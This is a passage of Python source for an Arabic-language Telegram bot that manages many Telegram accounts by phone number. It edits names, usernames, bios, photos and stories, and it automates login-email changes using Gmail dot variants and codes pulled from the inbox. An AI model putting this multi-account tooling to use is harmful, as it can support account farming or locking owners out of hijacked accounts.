    res_text = res[0][2] if res else "عفوا، حدث خطأ"
    await msg.answer(f"<blockquote>◉╮ 📝 نتيجة التعديل\n◉᚜┃ الرقم: {phone}\n◉╯ {res_text}</blockquote>", parse_mode="HTML")
    await state.clear()

@router.callback_query(F.data.startswith("e_ln_"))
async def e_ln_start(call: types.CallbackQuery, state: FSMContext):
    phone = call.data[5:]
    await state.update_data(target_phone=phone)
    await state.set_state(EditAccountState.waiting_for_last_name)
    await call.message.answer(f"<blockquote>◉╮ ✏️ تعديل الاسم\n◉╯ أرسل الاسم الثاني الجديد للرقم {phone.replace('+', '')}:</blockquote>", parse_mode="HTML")
    await call.answer()

@router.message(EditAccountState.waiting_for_last_name)
async def e_ln_process(msg: types.Message, state: FSMContext):
    data = await state.get_data()
    phone = data.get("target_phone")
    wait_msg = await msg.answer("<blockquote>◉╮ ⏳ جاري العمل\n◉╯ جاري تنفيذ التعديل...</blockquote>", parse_mode="HTML")
    res = await edit_last_name_task(phone, msg.text)
    try: await wait_msg.delete()
    except Exception: pass
    res_text = res[0][2] if res else "عفوا، حدث خطأ"
    await msg.answer(f"<blockquote>◉╮ 📝 نتيجة التعديل\n◉᚜┃ الرقم: {phone}\n◉╯ {res_text}</blockquote>", parse_mode="HTML")
    await state.clear()

@router.callback_query(F.data.startswith("e_un_"))
async def e_un_start(call: types.CallbackQuery, state: FSMContext):
    phone = call.data[5:]
    await state.update_data(target_phone=phone)
    await state.set_state(EditAccountState.waiting_for_username)
    await call.message.answer(f"<blockquote>◉╮ ✏️ تعديل اليوزر\n◉╯ أرسل اليوزر الجديد للرقم {phone.replace('+', '')} (بدون @):</blockquote>", parse_mode="HTML")
    await call.answer()

@router.message(EditAccountState.waiting_for_username)
async def e_un_process(msg: types.Message, state: FSMContext):
    data = await state.get_data()
    phone = data.get("target_phone")
    wait_msg = await msg.answer("<blockquote>◉╮ ⏳ جاري العمل\n◉╯ جاري تنفيذ التعديل...</blockquote>", parse_mode="HTML")
    res = await edit_username_task(phone, msg.text)
    try: await wait_msg.delete()
    except Exception: pass
    res_text = res[0][2] if res else "عفوا، حدث خطأ"
    await msg.answer(f"<blockquote>◉╮ 📝 نتيجة التعديل\n◉᚜┃ الرقم: {phone}\n◉╯ {res_text}</blockquote>", parse_mode="HTML")
    await state.clear()

@router.callback_query(F.data.startswith("e_delun_"))
async def e_delun_process(call: types.CallbackQuery):
    phone = call.data[8:]
    wait_msg = await call.message.answer("<blockquote>◉╮ ⏳ جاري العمل\n◉╯ جاري حذف اليوزر...</blockquote>", parse_mode="HTML")
    res = await delete_username_task(phone)
    try: await wait_msg.delete()
    except Exception: pass
    await call.message.answer(f"<blockquote>◉╮ ✏️ نتيجة التعديل\n◉᚜┃ الرقم: {phone}\n◉╯ " + (res[0][2] if res else "عفوا، حدث خطأ") + "</blockquote>", parse_mode="HTML")
    await call.answer()

@router.callback_query(F.data.startswith("e_bio_"))
async def e_bio_start(call: types.CallbackQuery, state: FSMContext):
    phone = call.data[6:]
    await state.update_data(target_phone=phone)
    await state.set_state(EditAccountState.waiting_for_bio)
    await call.message.answer(f"<blockquote>◉╮ ✏️ تعديل البايو\n◉╯ أرسل البايو الجديد للرقم {phone.replace('+', '')}:</blockquote>", parse_mode="HTML")
    await call.answer()

@router.message(EditAccountState.waiting_for_bio)
async def e_bio_process(msg: types.Message, state: FSMContext):
    data = await state.get_data()
    phone = data.get("target_phone")
    wait_msg = await msg.answer("<blockquote>◉╮ ⏳ جاري العمل\n◉╯ جاري تنفيذ التعديل...</blockquote>", parse_mode="HTML")
    res = await edit_bio_task(phone, msg.text)
    try: await wait_msg.delete()
    except Exception: pass
    res_text = res[0][2] if res else "عفوا، حدث خطأ"
    await msg.answer(f"<blockquote>◉╮ 📝 نتيجة التعديل\n◉᚜┃ الرقم: {phone}\n◉╯ {res_text}</blockquote>", parse_mode="HTML")
    await state.clear()

@router.callback_query(F.data.startswith("e_delbio_"))
async def e_delbio_process(call: types.CallbackQuery):
    phone = call.data[9:]
    wait_msg = await call.message.answer("<blockquote>◉╮ ⏳ جاري العمل\n◉╯ جاري حذف البايو...</blockquote>", parse_mode="HTML")
    res = await delete_bio_task(phone)
    try: await wait_msg.delete()
    except Exception: pass
    await call.message.answer(f"<blockquote>◉╮ ✏️ نتيجة التعديل\n◉᚜┃ الرقم: {phone}\n◉╯ " + (res[0][2] if res else "عفوا، حدث خطأ") + "</blockquote>", parse_mode="HTML")
    await call.answer()

@router.callback_query(F.data.startswith("e_delph_"))
async def e_delph_process(call: types.CallbackQuery):
    phone = call.data[8:]
    wait_msg = await call.message.answer("<blockquote>◉╮ ⏳ جاري العمل\n◉╯ جاري حذف الصور...</blockquote>", parse_mode="HTML")
    res = await delete_photo_task(phone)
    try: await wait_msg.delete()
    except Exception: pass
    await call.message.answer(f"<blockquote>◉╮ ✏️ نتيجة التعديل\n◉᚜┃ الرقم: {phone}\n◉╯ " + (res[0][2] if res else "عفوا، حدث خطأ") + "</blockquote>", parse_mode="HTML")
    await call.answer()

@router.callback_query(F.data.startswith("e_addph_"))
async def e_addph_start(call: types.CallbackQuery, state: FSMContext):
    phone = call.data[8:]
    await state.update_data(target_phone=phone)
    await state.set_state(EditAccountState.waiting_for_photo)
    await call.message.answer(f"<blockquote>◉╮ 🖼️ إضافة صورة\n◉╯ أرسل الصورة للرقم {phone.replace('+', '')}:</blockquote>", parse_mode="HTML")
    await call.answer()

@router.message(EditAccountState.waiting_for_photo, F.photo)
async def e_addph_process(msg: types.Message, state: FSMContext):
    data = await state.get_data()
    phone = data.get("target_phone")
    await msg.answer("<blockquote>◉╮ ⏳ جاري العمل\n◉╯ جاري رفع الصورة...</blockquote>", parse_mode="HTML")
    photo_path = f"temp_photo_{phone}.jpg"
    await msg.bot.download(msg.photo[-1], destination=photo_path)
    res = await add_photo_task(phone, photo_path)
    res_text = res[0][2] if res else "عفوا، حدث خطأ"
    await msg.answer(f"<blockquote>◉╮ 📝 نتيجة التعديل\n◉᚜┃ الرقم: {phone.replace('+', '')}\n◉╯ {res_text}</blockquote>", parse_mode="HTML")
    await state.clear()

@router.callback_query(F.data.startswith("e_story_"))
async def e_story_start(call: types.CallbackQuery, state: FSMContext):
    phone = call.data[8:]
    await state.update_data(target_phone=phone)
    await state.set_state(EditAccountState.waiting_for_story)
    await call.message.answer(f"<blockquote>◉╮ 📖 نشر ستوري\n◉╯ أرسل صورة أو فيديو للرقم {phone.replace('+', '')}:</blockquote>", parse_mode="HTML")
    await call.answer()

@router.message(EditAccountState.waiting_for_story, F.photo | F.video)
async def e_story_process(msg: types.Message, state: FSMContext):
    data = await state.get_data()
    phone = data.get("target_phone")
    await msg.answer("<blockquote>◉╮ ⏳ جاري العمل\n◉╯ جاري نشر الستوري...</blockquote>", parse_mode="HTML")
    media_path = f"temp_story_{phone}"
    if msg.photo:
        media_path += ".jpg"
        await msg.bot.download(msg.photo[-1], destination=media_path)
    elif msg.video:
        media_path += ".mp4"
        await msg.bot.download(msg.video, destination=media_path)
        
    res = await add_story_task(phone, media_path)
    res_text = res[0][2] if res else "عفوا، حدث خطأ"
    await msg.answer(f"<blockquote>◉╮ 📝 نتيجة التعديل\n◉᚜┃ الرقم: {phone.replace('+', '')}\n◉╯ {res_text}</blockquote>", parse_mode="HTML")
    await state.clear()

# ====== Login Email Change ======
@router.callback_query(F.data == "login_email_list")
async def login_email_list_handler(call: types.CallbackQuery):
    if call.from_user.id != OWNER_ID: return await call.answer("مرفوض")
    accs = await get_accounts()
    if not accs:
        return await call.answer("لا توجد حسابات مسجلة.", show_alert=True)
    
    btns = [[InlineKeyboardButton(text=a[0].replace('+', ''), callback_data=f"lgch_{a[0]}")] for a in accs]
    btns.append([InlineKeyboardButton(text="🔙 رجوع", callback_data="manage_2fa")])
    await call.message.edit_text("<blockquote>◉╮ 🔑 تغيير بريد تسجيل الدخول\n◉╯ اختر الحساب الذي تريد تغيير بريده:</blockquote>", reply_markup=InlineKeyboardMarkup(inline_keyboard=btns), parse_mode="HTML")
@router.message(LoginEmailState.waiting_for_email)
async def process_login_email_input(message: types.Message, state: FSMContext):
    new_email = message.text.strip()
    if "@" not in new_email or "." not in new_email:
        return await message.answer("<blockquote>◉╮ ❌ خطأ\n◉╯ يرجى إرسال بريد إلكتروني صحيح.</blockquote>", parse_mode="HTML")
    
    data = await state.get_data()
    phone = data.get("phone")
    
    sent_msg = await message.answer("<blockquote>◉╮ ⏳ جاري الطلب\n◉╯ جاري إرسال كود التحقق لبريد تسجيل الدخول...</blockquote>", parse_mode="HTML")
    success, result = await init_change_login_email_task(phone, new_email)
    
    if success:
        await state.update_data(new_email=new_email)
        await state.set_state(LoginEmailState.waiting_for_code)
        await sent_msg.edit_text(f"<blockquote>◉╮ 📩 كود التحقق\n◉╯ {result}</blockquote>", parse_mode="HTML")
    else:
        await state.clear()
        await sent_msg.edit_text(f"<blockquote>◉╮ ❌ فشل\n◉╯ {result}</blockquote>", parse_mode="HTML")

@router.message(LoginEmailState.waiting_for_code)
async def process_login_email_code(message: types.Message, state: FSMContext):
    raw_code = "".join(message.text.split())
    code = " ".join(list(raw_code))
    data = await state.get_data()
    phone = data.get("phone")
    
    sent_msg = await message.answer("<blockquote>◉╮ ⏳ جاري التحقق\n◉╯ جاري تأكيد تغيير بريد تسجيل الدخول...</blockquote>", parse_mode="HTML")
    try:
        success, result = await confirm_change_login_email_task(phone, code)
        if success:
            await state.clear()
            await sent_msg.edit_text(f"<blockquote>◉╮ ✅ تم بنجاح\n◉╯ {result}</blockquote>", parse_mode="HTML")
        else:
            await sent_msg.edit_text(f"<blockquote>◉╮ ❌ خطأ\n◉╯ {result}</blockquote>", parse_mode="HTML")
    except Exception as e:
        await sent_msg.edit_text(f"<blockquote>◉╮ ❌ خطأ فني\n◉╯ {e}</blockquote>", parse_mode="HTML")

# ====== Gmail Integration Command ======
@router.message(Command("set_gmail"))
async def set_gmail_handler(message: types.Message):
    if message.from_user.id != OWNER_ID: return
    args = message.text.split()
    if len(args) != 3:
        return await message.answer("<blockquote>◉╮ 💡 طريقة الاستخدام\n◉╯ `/set_gmail بريد_الجميل كلمة_مرور_التطبيقات`</blockquote>", parse_mode="MarkdownV2")
    
    email_user = args[1]
    app_pass = args[2]
    
    # تحديث الإعدادات في الذاكرة
    config.GMAIL_USER = email_user
    config.GMAIL_APP_PASSWORD = app_pass
    
    # حفظ في ملف .env
    with open(".env", "a") as f:
        f.write(f"\nGMAIL_USER={email_user}")
        f.write(f"\nGMAIL_APP_PASSWORD={app_pass}")
    
    await message.answer(f"<blockquote>◉╮ ✅ تم الربط بنجاح\n◉╯ تم حفظ بريد الجميل الخاص بك.\nسيقوم البوت الآن بسحب الأكواد تلقائياً عند تغيير بريد تسجيل الدخول.</blockquote>", parse_mode="HTML")

@router.callback_query(F.data.startswith("lgch_"))
async def login_email_start_handler(call: types.CallbackQuery, state: FSMContext):
    phone = call.data[5:]
    await state.update_data(phone=phone)
    
    # إذا كان هناك بريد محفوظ، اسأله إذا كان يريد استخدامه تلقائياً
    if config.GMAIL_USER:
        btns = [
            [InlineKeyboardButton(text=f"✅ استخدام البريد المحفوظ", callback_data=f"autolg_{phone}")],
            [InlineKeyboardButton(text="✉️ إدخال بريد آخر", callback_data=f"manlg_{phone}")]
        ]
        await call.message.edit_text(f"<blockquote>◉╮ 🔑 تغيير بريد الدخول {phone}\n◉╯ هل تريد استخدام البريد المحفوظ تلقائياً؟</blockquote>", reply_markup=InlineKeyboardMarkup(inline_keyboard=btns), parse_mode="HTML")
    else:
        await state.set_state(LoginEmailState.waiting_for_email)
        await call.message.edit_text(f"<blockquote>◉╮ 🔑 تغيير بريد الدخول {phone}\n◉╯ أرسل الآن البريد الإلكتروني الجديد:</blockquote>", parse_mode="HTML")
    await call.answer()

@router.callback_query(F.data.startswith("manlg_"))
async def manual_login_email_handler(call: types.CallbackQuery, state: FSMContext):
    phone = call.data[6:]
    await state.set_state(LoginEmailState.waiting_for_email)
    await call.message.edit_text(f"<blockquote>◉╮ 🔑 تغيير بريد الدخول {phone}\n◉╯ أرسل الآن البريد الإلكتروني الجديد:</blockquote>", parse_mode="HTML")
    await call.answer()

@router.callback_query(F.data.startswith("autolg_"))
async def auto_login_email_handler(call: types.CallbackQuery, state: FSMContext):
    phone = call.data[7:]
    # توليد نسخة عشوائية بالنقاط
    random_email = generate_dot_variant(config.GMAIL_USER, phone=phone)
    sent_msg = await call.message.edit_text(f"<blockquote>◉╮ ⏳ جاري العمل تلقائياً\n◉╯ جاري طلب تغيير البريد وسحب الكود...</blockquote>", parse_mode="HTML")
    
    success, result = await init_change_login_email_task(phone, random_email)
    if success:
        # محاولة سحب الكود تلقائياً
        await sent_msg.edit_text(f"<blockquote>◉╮ 📩 تم إرسال الطلب\n◉╯ جاري انتظار وصول الكود وسحبه تلقائياً...</blockquote>", parse_mode="HTML")
        code = await fetch_telegram_code()
        
        if code:
            await sent_msg.edit_text(f"<blockquote>◉╮ 🔢 تم سحب الكود\n◉╯ جاري التأكيد النهائي تلقائياً...</blockquote>", parse_mode="HTML")
            success_confirm, res_confirm = await confirm_change_login_email_task(phone, code)
            if success_confirm:
                await sent_msg.edit_text(f"<blockquote>◉╮ ✅ تم بنجاح تام\n◉╯ تم تغيير بريد تسجيل الدخول بنجاح.</blockquote>", parse_mode="HTML")
            else:
                await sent_msg.edit_text(f"<blockquote>◉╮ ❌ فشل التأكيد\n◉╯ {res_confirm}</blockquote>", parse_mode="HTML")
        else:
            await state.update_data(phone=phone, new_email=random_email)
            await state.set_state(LoginEmailState.waiting_for_code)
            await sent_msg.edit_text(f"<blockquote>◉╮ ⚠️ فشل السحب التلقائي\n◉╯ لم يتم العثور على الكود تلقائياً. يرجى إرسال الكود يدوياً الآن:</blockquote>", parse_mode="HTML")
    else:
        await sent_msg.edit_text(f"<blockquote>◉╮ ❌ فشل الطلب\n◉╯ {result}</blockquote>", parse_mode="HTML")
    await call.answer()
